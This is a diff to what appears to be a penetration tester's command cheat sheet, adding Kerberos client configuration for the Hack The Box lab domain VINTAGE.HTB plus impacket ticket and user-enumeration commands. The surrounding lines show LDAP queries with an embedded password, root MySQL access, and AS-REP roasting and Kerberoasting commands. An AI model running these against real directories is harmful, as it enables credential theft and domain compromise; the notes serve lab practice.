@@ -39,6 +39,24 @@
     mysql -h 172.16.1.10 -u root@localhost -e 'show databases;'
     ldapsearch -H ldap://dc01.xxxxxx.xxx/ -D "xxxxxx\P.Rosa" -w 'Rosaisbest123' -b "" -s base "(objectClass=*)" | grep -v 'supported'
     ldapsearch -H ldap://dc01.xxxxxx.xxx/ -D "xxxxxx\P.Rosa" -w 'Rosaisbest123' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
+    impacket-getST -spn dc01 vintage.htb/'USERNAME':'PASSWORD'
+    /etc/krb5.conf
+    [libdefaults]
+    default_realm = VINTAGE.HTB
+    dns_lookup_kdc = true
+    dns_lookup_realm = false
+    [realms]
+    VINTAGE.HTB = {
+        kdc = dc01.vintage.htb
+        admin_server = dc01.vintage.htb
+    }
+    [domain_realm]
+    .vintage.htb = VINTAGE.HTB
+    vintage.htb = VINTAGE.HTB
+    export KRB5CCNAME=/home/daddybigfish/USERNAME@dc01@VINTAGE.HTB.ccache
+    kinit -c /home/daddybigfish/USERNAME@dc01@VINTAGE.HTB.ccache USERNAME@VINTAGE.HTB
+    klist
+    impacket-GetADUsers -dc-host dc01.vintage.htb -k vintage.htb/
     impacket-GetNPUsers -usersfile usernames domain/ -dc-ip 172.16.1.10
     impacket-GetUserSPNs -request-user "$objuser" -dc-ip 172.16.1.10 domain/username:password
     impacket-GetUserSPNs -no-preauth "$user" -usersfile usernames -dc-host 172.16.1.10 domain/
